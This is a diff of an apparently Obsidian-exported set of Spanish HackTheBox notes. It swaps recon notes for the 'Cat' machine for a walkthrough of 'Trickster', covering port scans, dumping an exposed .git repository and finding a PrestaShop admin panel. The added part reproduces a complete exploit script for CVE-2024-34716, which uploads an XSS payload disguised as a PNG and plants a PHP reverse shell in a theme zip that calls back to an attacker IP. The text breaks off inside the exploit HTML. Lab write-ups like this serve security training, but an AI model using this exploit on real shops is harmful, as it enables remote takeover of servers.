@@ -1,1003 +1,1053 @@
-<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[HTB]]></title><description><![CDATA[Obsidian digital garden]]></description><link>http://github.com/dylang/node-rss</link><image><url>lib/media/favicon.png</url><title>HTB</title><link></link></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Tue, 11 Feb 2025 09:57:08 GMT</lastBuildDate><atom:link href="lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Tue, 11 Feb 2025 09:57:06 GMT</pubDate><ttl>60</ttl><dc:creator></dc:creator><item><title><![CDATA[1 - Recon]]></title><description><![CDATA[ 
- <br>Puertos tcp abiertos nmap Syn scan<br>sudo nmap -sS -p- -T4 -Pn -n  -v cat.htb 
-Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-06 11:51 CET
-Initiating SYN Stealth Scan at 11:51
-Scanning cat.htb (10.10.11.53) [65535 ports]
-Discovered open port 80/tcp on 10.10.11.53
-Discovered open port 22/tcp on 10.10.11.53
-Completed SYN Stealth Scan at 11:52, 20.10s elapsed (65535 total ports)
-Nmap scan report for cat.htb (10.10.11.53)
-Host is up (0.062s latency).
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[HTB]]></title><description><![CDATA[Obsidian digital garden]]></description><link>http://github.com/dylang/node-rss</link><image><url>lib/media/favicon.png</url><title>HTB</title><link></link></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Sat, 15 Feb 2025 12:38:33 GMT</lastBuildDate><atom:link href="lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Sat, 15 Feb 2025 12:38:30 GMT</pubDate><ttl>60</ttl><dc:creator></dc:creator><item><title><![CDATA[1.Recon]]></title><description><![CDATA[ 
+ <br>Nmap TCP port SYN scan<br>sudo nmap -sS -Pn -n --min-rate 5000 -p- trickster.htb -oG nmapsS
+[sudo] password for cher0: 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-12 10:15 CET
+Nmap scan report for trickster.htb (10.10.11.34)
+Host is up (0.043s latency).
 Not shown: 65533 closed tcp ports (reset)
 PORT   STATE SERVICE
 22/tcp open  ssh
 80/tcp open  http
 
-Read data files from: /usr/share/nmap
-Nmap done: 1 IP address (1 host up) scanned in 20.20 seconds
-           Raw packets sent: 65943 (2.901MB) | Rcvd: 65605 (2.625MB)
-<br>Puertos UDP abiertos<br>None
-<br>Analisis de puertos<br>sudo nmap -sCV -p 22,80 -T4 -Pn -n -v cat.htb
-ost is up (0.040s latency).
+Nmap done: 1 IP address (1 host up) scanned in 11.42 seconds
+<br>Nmap TCP CV scan<br>sudo nmap -sCV -Pn -n --min-rate 5000 -p 22,80 trickster.htb -oG nmapsCV 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-12 10:15 CET
+Nmap scan report for trickster.htb (10.10.11.34)
+Host is up (0.060s latency).
 
 PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
-|   3072 96:2d:f5:c6:f6:9f:59:60:e5:65:85:ab:49:e4:76:14 (RSA)
-|   256 9e:c4:a4:40:e9:da:cc:62:d1:d6:5a:2f:9e:7b:d4:aa (ECDSA)
-|_  256 6e:22:2a:6a:6d:eb:de:19:b7:16:97:c2:7e:89:29:d5 (ED25519)
-80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
-| http-methods: 
-|_  Supported Methods: GET HEAD POST OPTIONS
-| http-cookie-flags: 
-|   /: 
-|     PHPSESSID: 
-|_      httponly flag not set
-| http-git: 
-|   10.10.11.53:80/.git/
-|     Git repository found!
-|     Repository description: Unnamed repository; edit this file 'description' to name the...
-|_    Last commit message: Cat v1 
-|_http-title: Best Cat Competition
-|_http-server-header: Apache/2.4.41 (Ubuntu)
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+|   256 8c:01:0e:7b:b4:da:b7:2f:bb:2f:d3:a3:8c:a6:6d:87 (ECDSA)
+|_  256 90:c6:f3:d8:3f:96:99:94:69:fe:d3:72:cb:fe:6c:c5 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52
+|_http-title: 403 Forbidden
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Service Info: Host: _; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-NSE: Script Post-scanning.
-Initiating NSE at 11:53
-Completed NSE at 11:53, 0.00s elapsed
-Initiating NSE at 11:53
-Completed NSE at 11:53, 0.00s elapsed
-Initiating NSE at 11:53
-Completed NSE at 11:53, 0.00s elapsed
-Read data files from: /usr/share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 12.20 seconds
-           Raw packets sent: 2 (88B) | Rcvd: 2 (88B)
+Nmap done: 1 IP address (1 host up) scanned in 13.41 seconds
+<br><br><img alt="Pasted image 20250212101724.png" src="machines/trickster/imgs/pasted-image-20250212101724.png"><br>
+El apartado "shop" nos redirecciona a la siguiente url: <a rel="noopener nofollow" class="external-link" href="http://shop.trickster.htb/" target="_blank">http://shop.trickster.htb/</a><br>
+la metemos en el /etc/hosts<br>10.10.11.34 trickster.htb shop.trickster.htb
+<br><br>Vamos a aplicar Fuzzing;<br><br>feroxbuster -u http://trickster.htb -r -w /usr/share/seclist/Discovery/Web-Content/raft-large-directories-lowercase.txt -C 503
+                                                                                                                      
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher                    ver: 2.11.0
+───────────────────────────┬──────────────────────
+     Target Url            │ http://trickster.htb
+     Threads               │ 50
+     Wordlist              │ /usr/share/seclist/Discovery/Web-Content/raft-large-directories-lowercase.txt
+     Status Code Filters   │ [503]
+     Timeout (secs)        │ 7
+     User-Agent            │ feroxbuster/2.11.0
+     Config File           │ /etc/feroxbuster/ferox-config.toml
+     Extract Links         │ true
+     HTTP methods          │ [GET]
+     Follow Redirects      │ true
+     Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET        2l       87w     2438c http://trickster.htb/assets/js/breakpoints.min.js
+200      GET       37l       80w      568c http://trickster.htb/assets/css/noscript.css
+200      GET      587l     1232w    11847c http://trickster.htb/assets/js/util.js
+200      GET      401l      738w     8035c http://trickster.htb/assets/js/main.js
+200      GET       22l       68w     8886c http://trickster.htb/images/overlay.png
+200      GET     1638l     3543w    34125c http://trickster.htb/assets/css/main.css
+200      GET        2l     1283w    86927c http://trickster.htb/assets/js/jquery.min.js
+503      GET       11l       42w      378c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+503      GET       11l       42w      378c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET     3386l    19800w  1485483c http://trickster.htb/images/pic01.jpg
+200      GET     7017l    47787w  3060292c http://trickster.htb/images/pic02.jpg
+200      GET     7166l    43779w  3126314c http://trickster.htb/images/pic03.jpg
+200      GET      355l      927w    12683c http://trickster.htb/
+200      GET    13704l    73264w  5732348c http://trickster.htb/images/bg.jpg
+200      GET       20l       94w     1730c http://trickster.htb/images/
+<br><br><br>➜  ~ wappalyzer -i http://shop.trickster.htb
+http://shop.trickster.htb Apache HTTP Server v2.4.52, Ubuntu, PrestaShop, jQuery v3.5.1, jQuery UI v1.10.3, PHP, Bootstrap, core-js v2.6.12, jQuery Migrate v3.1.0, Cart Functionality, Open Graph
+<br>El subdomino usa Prestashop;<br>
+PrestaShop es un sistema de gestión de contenidos libre y de código abierto pensado para construir desde cero tiendas en línea de comercio electrónico. Enfocado para permitir crear tiendas en línea desde pequeñas empresas a grandes corporaciones<br><br>feroxbuster -u http://shop.trickster.htb -r -w /usr/share/seclist/Discovery/Web-Content/raft-large-directories-lowercase.txt -C 503 403
+                                                                                                                      
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher                    ver: 2.11.0
+───────────────────────────┬──────────────────────
+     Target Url            │ http://shop.trickster.htb
+     Threads               │ 50
+     Wordlist              │ /usr/share/seclist/Discovery/Web-Content/raft-large-directories-lowercase.txt
+     Status Code Filters   │ [503, 403]
+     Timeout (secs)        │ 7
+     User-Agent            │ feroxbuster/2.11.0
+     Config File           │ /etc/feroxbuster/ferox-config.toml
+     Extract Links         │ true
+     HTTP methods          │ [GET]
+     Follow Redirects      │ true
+     Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+200      GET     1043l     2429w    44977c http://shop.trickster.htb/password-recovery
+404      GET     1006l     2319w    43228c http://shop.trickster.htb/log
+200      GET        7l       17w      112c http://shop.trickster.htb/.git/config
+200      GET        1l        2w       28c http://shop.trickster.htb/.git/HEAD
+200      GET     1423l     2799w    53077c http://shop.trickster.htb/registration
+200      GET        1l       10w       73c http://shop.trickster.htb/.git/description
+200      GET        1l        3w       20c http://shop.trickster.htb/.git/COMMIT_EDITMSG
+200      GET     1071l     2387w    44984c http://shop.trickster.htb/guest-tracking
+200      GET        1l       11w      163c http://shop.trickster.htb/.git/logs/HEAD
+200      GET        6l       43w      240c http://shop.trickster.htb/.git/info/exclude
+200      GET       53l      234w     1374c http://shop.trickster.htb/.git/hooks/pre-push.sample
+200      GET       78l      499w     2783c http://shop.trickster.htb/.git/hooks/push-to-checkout.sample
+200      GET       42l      238w     1492c http://shop.trickster.htb/.git/hooks/prepare-commit-msg.sample
+200      GET        8l       32w      189c http://shop.trickster.htb/.git/hooks/post-update.sample
+200      GET       13l       67w      416c http://shop.trickster.htb/.git/hooks/pre-merge-commit.sample
+200      GET       24l       83w      544c http://shop.trickster.htb/.git/hooks/pre-receive.sample
+200      GET       14l       69w      424c http://shop.trickster.htb/.git/hooks/pre-applypatch.sample
+200      GET       49l      279w     1643c http://shop.trickster.htb/.git/hooks/pre-commit.sample
+200      GET      174l      675w     4726c http://shop.trickster.htb/.git/hooks/fsmonitor-watchman.sample
+200      GET      978l     2780w   316386c http://shop.trickster.htb/.git/index
+200      GET      128l      546w     3650c http://shop.trickster.htb/.git/hooks/update.sample
+200      GET       15l       79w      478c http://shop.trickster.htb/.git/hooks/applypatch-msg.sample
+200      GET       77l      323w     2308c http://shop.trickster.htb/.git/hooks/sendemail-validate.sample
+200      GET      169l      798w     4898c http://shop.trickster.htb/.git/hooks/pre-rebase.sample
+200      GET       24l      163w      896c http://shop.trickster.htb/.git/hooks/commit-msg.sample
+200      GET        1l        1w       41c http://shop.trickster.htb/.git/refs/heads/admin_panel
+404      GET     1006l     2319w    43251c http://shop.trickster.htb/upload/
+200      GET     1155l     2446w    46526c http://shop.trickster.htb/login
+200      GET     1155l     2446w    46636c http://shop.trickster.htb/login?back=my-account
+404      GET     1006l     2319w    43294c http://shop.trickster.htb/.git/hooks/.git
+200      GET     1102l     2444w    46283c http://shop.trickster.htb/cart?action=show
+404      GET     1006l     2319w    43326c http://shop.trickster.htb/.git/refs/heads/.git/
+404      GET     1006l     2319w    43350c http://shop.trickster.htb/.git/refs/heads/.git/refs
+200      GET     1155l     2446w    46615c http://shop.trickster.htb/login?back=history
+200      GET     1051l     2357w    44462c http://shop.trickster.htb/search
+404      GET     1006l     2319w    43345c http://shop.trickster.htb/.git/refs/tags/.git/refs
+404      GET     1006l     2319w    43325c http://shop.trickster.htb/.git/refs/tags/.git/
+200      GET     1155l     2446w    46629c http://shop.trickster.htb/login?back=addresses
+404      GET     1006l     2319w    43325c http://shop.trickster.htb/.git/logs/refs/.git/
+404      GET     1006l     2319w    43309c http://shop.trickster.htb/.git/branches/.git
 
-<br><br><br><br>➜  ~ whatweb http://cat.htb:80
+<br>Durante el fuzzing encontramos un repositorio /.git accesible;  tratamos de dumpearlo<br><br>Con la herramienta de <a data-tooltip-position="top" aria-label="https://github.com/arthaud/git-dumper" rel="noopener nofollow" class="external-link" href="https://github.com/arthaud/git-dumper" target="_blank">git-dumper</a> dumpeamos todo el directorio de /.git<br> ./git_dumper.py http://shop.trickster.htb/.git/ DUMP
+<br>DUMP:<br>
+En el directorio encontramos varios archivos, entre ellos un Makefile lo que nos puede dar una pista de que nos enfrentamos a un contenedor de Docker y varios archivos .php lo que nos confirma que el servidor maneja lenguaje php que nos puede ser de ayuda para explotar la maquina<br>(venv) ➜  DUMP git:(admin_panel) ls -ls
+total 216
+  8 -rw-rw-r-- 1 cher0 cher0   5054 Feb 12 12:16 INSTALL.txt
+  4 -rw-rw-r-- 1 cher0 cher0    522 Feb 12 12:16 Install_PrestaShop.html
+180 -rw-rw-r-- 1 cher0 cher0 183862 Feb 12 12:16 LICENSES
+  4 -rw-rw-r-- 1 cher0 cher0    863 Feb 12 12:16 Makefile
+  4 drwxrwxr-x 8 cher0 cher0   4096 Feb 12 12:16 admin634ewutrx1jgitlooaj
+  4 -rw-rw-r-- 1 cher0 cher0   1305 Feb 12 12:16 autoload.php
+  4 -rw-rw-r-- 1 cher0 cher0   2506 Feb 12 12:16 error500.html
+  4 -rw-rw-r-- 1 cher0 cher0   1169 Feb 12 12:16 index.php
+  4 -rw-rw-r-- 1 cher0 cher0   1256 Feb 12 12:16 init.php
 
-http://cat.htb:80 [200 OK] Apache[2.4.41], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.53], Title[Best Cat Competition]
-<br>Vista principal:<br>
-<img alt="Pasted image 20250206115548.png" src="machines/cat/imgs/pasted-image-20250206115548.png"><br><br>Hacemos fuzzing de subdominos a ver si encontramos alguno;<br>sudo wfuzz -c -f sub-fighter.txt -Z -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --sc 200,202,204,301,302,307,403 http://FUZZ.cat.htb:80 
-********************************************************
-* Wfuzz 3.1.0 - The Web Fuzzer                         *
-********************************************************
+<br>En el Install.txt vemos que la instalacion se trata de un Pentashop 8 lo que nos puede indicar que el software esta usando su version 8; tambien nos confirma que precisa de PHP v 7.2 o superior y un servidor de datos MySQL.<br><img alt="Pasted image 20250212122216.png" src="machines/trickster/imgs/pasted-image-20250212122216.png"><br>si entramos en el endpoint /admin634ewutrx1jgitlooaj encontramos un admin panel en shop; ademas descubrimos la version de PrestaShop que corre en la 8.1.5<br><img alt="Pasted image 20250213103827.png" src="machines/trickster/imgs/pasted-image-20250213103827.png"><br><br>Esta version de PrestaShop es vulnerable a XSS ; <a data-tooltip-position="top" aria-label="https://github.com/PrestaShop/PrestaShop/security/advisories/GHSA-45vm-3j38-7p78" rel="noopener nofollow" class="external-link" href="https://github.com/PrestaShop/PrestaShop/security/advisories/GHSA-45vm-3j38-7p78" target="_blank">github</a><br>El exploit se puede triggerear en el contact form de la pagina; un atacante puede subir un archivo malicioso que triggerea el XSS cuando lo abre el administrador ;<br>Nos dirigimos al formulario<br>http://shop.trickster.htb/contact-us
+<br><img alt="Pasted image 20250213104457.png" src="machines/trickster/imgs/pasted-image-20250213104457.png"><br>Encuentro este <a data-tooltip-position="top" aria-label="https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/" rel="noopener nofollow" class="external-link" href="https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/" target="_blank">documento</a> que detalla la explotacion de la vulnerabilidad <br>Nos bajamos el script automatizado de github y lo analizamos, el documento ya aclara como se explota la vulnerabilidad XSS pero podemos llegar a RCE enviando un .html malicioso disfrazado de imagen png;<br>➜  CVE-2024-34716_PoC git:(main) ls -laF 
+total 7320
+drwxrwxr-x 3 cher0 cher0    4096 Feb 13 10:51 ./
+drwxrwxr-x 5 cher0 cher0    4096 Feb 13 10:51 ../
+drwxrwxr-x 8 cher0 cher0    4096 Feb 13 10:51 .git/
+-rw-rw-r-- 1 cher0 cher0      47 Feb 13 10:51 .gitignore
+-rw-rw-r-- 1 cher0 cher0     346 Feb 13 10:51 README.md
+-rw-rw-r-- 1 cher0 cher0    4434 Feb 13 10:51 exploit.html
+-rw-rw-r-- 1 cher0 cher0    5100 Feb 13 10:51 exploit.py
+-rw-rw-r-- 1 cher0 cher0 7444481 Feb 13 10:51 ps_next_8_theme_malicious_old.zip
+-rw-rw-r-- 1 cher0 cher0      32 Feb 13 10:51 requirements.txt
+-rw-rw-r-- 1 cher0 cher0    5496 Feb 13 10:51 reverse_shell_template.php
 
-Target: http://FUZZ.cat.htb:80/
-Total requests: 4992
-
-=====================================================================
-ID           Response   Lines    Word       Chars       Payload                                                                                 
-=====================================================================
-
-
-^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...
-
-Total time: 975.6446
-Processed Requests: 2657
-Filtered Requests: 2657
-Requests/sec.: 2.723327
-
-<br>Ningun subdomino encontrado de momento;<br>Usamos Feroxbuster para el fuzzing de endpoints en <a rel="noopener nofollow" class="external-link" href="http://cat.htb:80" target="_blank">http://cat.htb:80</a><br>200      GET       41l       83w     1242c http://cat.htb/vote.php
-200      GET      140l      327w     4004c http://cat.htb/join.php
-200      GET      127l      270w     2900c http://cat.htb/css/styles.css
-200      GET      196l      415w     5082c http://cat.htb/winners.php
-200      GET      129l      285w     3075c http://cat.htb/
-200      GET      127l      270w     2900c http://cat.htb/css/styles
-200      GET      304l     1647w   132808c http://cat.htb/img/cat1
-200      GET      904l     5604w   448419c http://cat.htb/img/cat2
-[####################] - 2m     56163/56163   535/s   http://cat.htb/ 
-[####################] - 2m     56163/56163   535/s   http://cat.htb/uploads/ 
-[####################] - 2m     56163/56163   552/s   http://cat.htb/img/ 
-[####################] - 2m     56163/56163   561/s   http://cat.htb/css/ 
-[####################] - 2m     56163/56163   586/s   http://cat.htb/winners/    
-<br><br><img alt="Pasted image 20250206120226.png" src="machines/cat/imgs/pasted-image-20250206120226.png"><br>
-Si pinchamos en Already have an account? nos redirige al endpoint /join.php Pruebo a logearme:<br>
-<img alt="Pasted image 20250206120341.png" src="machines/cat/imgs/pasted-image-20250206120341.png"><br>
-Parece que el servidor maneja cookies de autenticacion<br>
-<img alt="Pasted image 20250206120416.png" src="machines/cat/imgs/pasted-image-20250206120416.png"><br>PHPSESSID:"el281bprg2ti42m6j0htoq4bom"
-<br><br>Una vez logueados parece que podemos apuntar a nuestro gato en el concurso a traves del formulario en /contest.php vamos a analizar la subida de imagenes en burp<br>
-<img alt="Pasted image 20250206120536.png" src="machines/cat/imgs/pasted-image-20250206120536.png"><br>Realizamos el formulario para nuestro gato cyberpunk:<br>
-<img alt="Pasted image 20250206120915.png" src="machines/cat/imgs/pasted-image-20250206120915.png"><br>
-Request:<br>POST /contest.php HTTP/1.1
-Host: cat.htb
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate, br
-Content-Type: multipart/form-data; boundary=---------------------------2525655587332479862513910270
-Content-Length: 125072
-Origin: http://cat.htb
-Connection: keep-alive
-Referer: http://cat.htb/contest.php
-Cookie: PHPSESSID=el281bprg2ti42m6j0htoq4bom
-Upgrade-Insecure-Requests: 1
-Priority: u=0, i
-
------------------------------2525655587332479862513910270
-Content-Disposition: form-data; name="cat_name"
-
-GATO2
------------------------------2525655587332479862513910270
-Content-Disposition: form-data; name="age"
-
-23
------------------------------2525655587332479862513910270
-Content-Disposition: form-data; name="birthdate"
-
-2077-02-02
------------------------------2525655587332479862513910270
-Content-Disposition: form-data; name="weight"
-
-95
------------------------------2525655587332479862513910270
-Content-Disposition: form-data; name="cat_photo"; filename="image(1).png"
-Content-Type: image/png
-
-PNG
-
-
-IHDR7SËöÓ7	pHYsÄÄ+ IDATxìw\GÇ½JïJ·6P{ïÝ{ï-ÄDc7±
-...
-<br>Response:<br>HTTP/1.1 200 OK
-Date: Thu, 06 Feb 2025 11:09:45 GMT
-Server: Apache/2.4.41 (Ubuntu)
-Expires: Thu, 19 Nov 1981 08:52:00 GMT
-Cache-Control: no-store, no-cache, must-revalidate
-Pragma: no-cache
-Vary: Accept-Encoding
-Content-Length: 2391
-Keep-Alive: timeout=5, max=100
-Connection: Keep-Alive
-Content-Type: text/html; charset=UTF-8
+<br>Atached a zip theme file that was used for testing and the same ZIP contains a .htaccess file with the content below, which will enforce and allow access to the directory where we host our reverse_shell.php. It’s basically to allow everyone to view or interact with the contents of the directory without restrictions, because if we didn’t do this, we wouldn’t be able to access our reverse_shell.php that grants us a reverse shell and we would get forbidden instead.<br>&lt;IfModule mod_authz_core.c&gt;
+ Require all granted
+&lt;/IfModule&gt;
+<br><br>Analizamos el siguiente PoC del CVE para conseguir RCE en PrestaShop;<br>import argparse, requests, subprocess, time, threading, atexit, http.server, socketserver,zipfile,shutil,os
+from bs4 import BeautifulSoup
 
 
+print_lock = threading.Lock()
+stop_event = threading.Event()
 
-&lt;!DOCTYPE html&gt;
+def __parse_args():    
+    parser = argparse.ArgumentParser(description="CVE-2024-34716 Exploit")
+    parser.add_argument("--url", help="The Presta Shop base url.", required=True)
+    parser.add_argument("--email", help="The email address of admin user.", required=True)
+    parser.add_argument("--local-ip", help="Local HTTP Server IP.", required=True)
+    parser.add_argument("--admin-path", help="The Presta Shop admin path.", required=True) 
+    
+    args = parser.parse_args()
+    
+    host_url = args.url
+    email = args.email
+    local_ip = args.local_ip
+    admin_path = args.admin_path
+
+    print("[X] Starting exploit with:")
+    print(f"\tUrl: {host_url}")
+    print(f"\tEmail: {email}")
+    print(f"\tLocal IP: {local_ip}")
+    print(f"\tAdmin Path: {admin_path}")
+                
+    return (host_url, email, local_ip, admin_path)
+    
+    
+def send_get_requests(url, interval=5):
+    while not stop_event.is_set():
+        try:
+            response = requests.get(url)
+            if response.status_code == 504 or response.status_code == 200:
+                stop_event.set()
+                return
+            print(f"GET request to {url}: {response.status_code}")
+            
+        except requests.RequestException as e:
+            with print_lock:
+                print(f"Error during GET request: {e}") # Can comment this out if thread isn't stopped.
+        time.sleep(interval)
+
+
+def run_http_server():
+    PORT = 5000
+    with socketserver.TCPServer(("", PORT), CustomRequestHandler) as httpd:
+        with print_lock:
+            print("Serving at http.Server on port", PORT)
+        while not stop_event.is_set():
+            httpd.handle_request()
+        
+
+def main():    
+    host_url, email, local_ip, admin_path = __parse_args()
+
+    with open('./exploit.html', 'r') as file:
+        html_content = file.read()
+
+    if host_url[-1] == '/':
+        host_url = host_url[:-1]
+
+    html_content = html_content.replace("BASE_URL", f'"{host_url}"')
+    html_content = html_content.replace("ATTACKER_IP", f'"{local_ip}"')
+    html_content = html_content.replace("ATTACKER_PORT", "5000")
+    html_content = html_content.replace("ADMIN_PATH", f'"{admin_path}"')
+    html_content = html_content.replace("FILE_NAME", '"ps_next_8_theme_malicious.zip"')
+
+    with open('./reverse_shell_template.php', 'r') as file:
+        reverse_shell_content = file.read()
+    
+    reverse_shell_content = reverse_shell_content.replace("ATTACKER_IP", f'"{local_ip}"')
+    reverse_shell_content = reverse_shell_content.replace("ATTACKER_PORT", "12345")
+
+    with open('./reverse_shell.php', 'w') as file:
+        file.write(reverse_shell_content)
+    
+    shutil.copy('ps_next_8_theme_malicious_old.zip', 'ps_next_8_theme_malicious.zip')
+    with zipfile.ZipFile('ps_next_8_theme_malicious.zip', 'a') as zipf:
+        zipf.write('reverse_shell.php','reverse_shell_new.php')
+
+
+
+    url = f"{host_url}/contact-us"
+
+    response = requests.get(url)
+    response.raise_for_status()
+
+    soup = BeautifulSoup(response.text, 'html.parser')
+    token = soup.find('input', {'name': 'token'})['value']
+    cookies = response.cookies
+
+    files = {
+        'fileUpload': ('test.png', html_content, 'image/png'),
+    }
+
+    data = {
+        'id_contact': '2',
+        'from': email,
+        'message': 'pwned',
+        'url': '',
+        'token': token,
+        'submitMessage': 'Send'
+    }
+
+    response = requests.post(url, files=files, data=data, cookies=cookies)
+    url = f"{host_url}/themes/next/reverse_shell_new.php"
+
+    req_thread = threading.Thread(target=send_get_requests, args=(url, 15,))
+    req_thread.daemon = True
+    req_thread.start()
+    
+    server_thread = threading.Thread(target=run_http_server)
+    server_thread.daemon = True
+    server_thread.start()
+
+    if response.status_code == 200:
+        print(f"[X] Ncat is now listening on port 12345. Press Ctrl+C to terminate.")
+        
+        output = subprocess.call(["ncat", "-lnvp", "12345"], shell=False)
+        if b"Ncat: Connection from " in output:
+            with print_lock:
+                print("Stopping threads!")
+            stop_event.set()
+        else:
+            print(f"DEBUG:: {output}")
+    else:
+        print(f"[!] Failed to send the message. Status code: {response.status_code} Reason: {response.reason}")
+
+
+def clean():
+    if os.path.exists('ps_next_8_theme_malicious.zip'):
+        os.remove('ps_next_8_theme_malicious.zip')
+    if os.path.exists('reverse_shell.php'):
+        os.remove('reverse_shell.php')
+
+class CustomRequestHandler(http.server.SimpleHTTPRequestHandler):
+    def log_request(self, code='-', size='-'):
+        with print_lock:
+            print(f"Request: {self.command} {self.path} {self.request_version}")
+            print(f"Response: {code} {size}")
+        super().log_request(code, size)
+
+
+
+if __name__ == "__main__":
+    clean()
+    atexit.register(clean)
+    main()
+
+<br><br>Esta función configura y parsea los argumentos necesarios para ejecutar el exploit:<br>
+<br>Argumentos requeridos :
+
+<br>--url: URL base del sitio vulnerable.
+<br>--email: Dirección de correo electrónico del administrador.
+<br>--local-ip: IP local donde se ejecutará el servidor HTTP y el shell inverso.
+<br>--admin-path: Ruta del panel de administración de PrestaShop.
+
+
+<br>Después de parsear los argumentos, imprime la configuración seleccionada.<br><br>Esta función envía solicitudes GET repetidas a una URL específica hasta que ocurra una condición de detención (stop_event.is_set()).<br>
+<br>Si recibe un código de respuesta 504 o 200, detiene las solicitudes.
+<br>Utiliza un intervalo entre solicitudes para evitar saturar el servidor.
+<br><br>Levanta un servidor HTTP local en el puerto 5000:<br>
+<br>Usa CustomRequestHandler como manejador personalizado para registrar las solicitudes entrantes.
+<br>El servidor permanece activo hasta que se establezca stop_event.****
+<br><br>Esta es la función principal del script, donde ocurre la lógica del exploit:<br><br>
+<br>Lee el archivo exploit.html y reemplaza marcadores de posición (BASE_URL, ATTACKER_IP, etc.) con los valores proporcionados por el usuario.
+
+<br>exploit.html:
+
+
+<br>&lt;!DOCTYPE html&gt;
 &lt;html lang="en"&gt;
+
 &lt;head&gt;
-&lt;meta charset="UTF-8"&gt;
-&lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
-&lt;title&gt;Contest - Best Cat Community&lt;/title&gt;
-&lt;link rel="stylesheet" href="css/styles.css"&gt;
-&lt;style&gt;
-    .container {
-        max-width: 600px;
-        margin: 20px auto;
-        padding: 20px;
-        background-color: #fff;
-        border-radius: 5px;
-        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-    }
-    form {
-        padding: 20px;
-        box-sizing: border-box;
-    }
-    label,
-    input {
-        display: block;
-        margin-bottom: 10px;
-        width: 100%;
-    }
-    input[type="submit"] {
-        background-color: #007bff;
-        color: #fff;
-        border: none;
-        border-radius: 5px;
-        padding: 15px 20px;
-        cursor: pointer;
-        transition: background-color 0.3s;
-        width: 100%;
-    }
-    input[type="submit"]:hover {
-        background-color: #0056b3;
-    }
-    .message {
-        margin-top: 20px;
-        text-align: center;
-        color: green;
-    }
-    .error-message {
-        margin-top: 20px;
-        text-align: center;
-        color: red;
-    }
-&lt;/style&gt;
+    &lt;meta charset="UTF-8"&gt;
+    &lt;meta viewport="width=device-width, initial-scale=1.0"&gt;
+    &lt;title&gt;Exploit&lt;/title&gt;
 &lt;/head&gt;
+
 &lt;body&gt;
+    &lt;script&gt;
+        const baseUrl = BASE_URL;
+        const path = ADMIN_PATH;
+        const httpServerIp = ATTACKER_IP;
+        const httpServerPort = ATTACKER_PORT;
+        const fileNameOfTheme = FILE_NAME;
 
-    &lt;div class="navbar"&gt;
-        &lt;a href="/"&gt;Home&lt;/a&gt;
-        &lt;a href="/vote.php"&gt;Vote&lt;/a&gt;
-        &lt;a href="/contest.php"&gt;Contest&lt;/a&gt;
-        &lt;a href="/winners.php"&gt;Winners&lt;/a&gt;
-        &lt;a href="/logout.php"&gt;Logout&lt;/a&gt;    &lt;/div&gt;
+        async function fetchTokenFromHTML() {
+            const url = `${baseUrl}/${path}/index.php/improve/design/themes/import`;
+            try {
+                const response = await fetch(url, {
+                    method: 'GET',
+                    credentials: 'include',
+                    redirect: 'follow'
+                });
+                if (!response.ok) throw new Error('Failed to fetch the page for token extraction. Status: ' + response.status);
 
-    &lt;div class="container"&gt;
-        &lt;h1&gt;Contest - Best Cat Community&lt;/h1&gt;
-                    &lt;div class="message"&gt;Cat has been successfully sent for inspection.&lt;/div&gt;
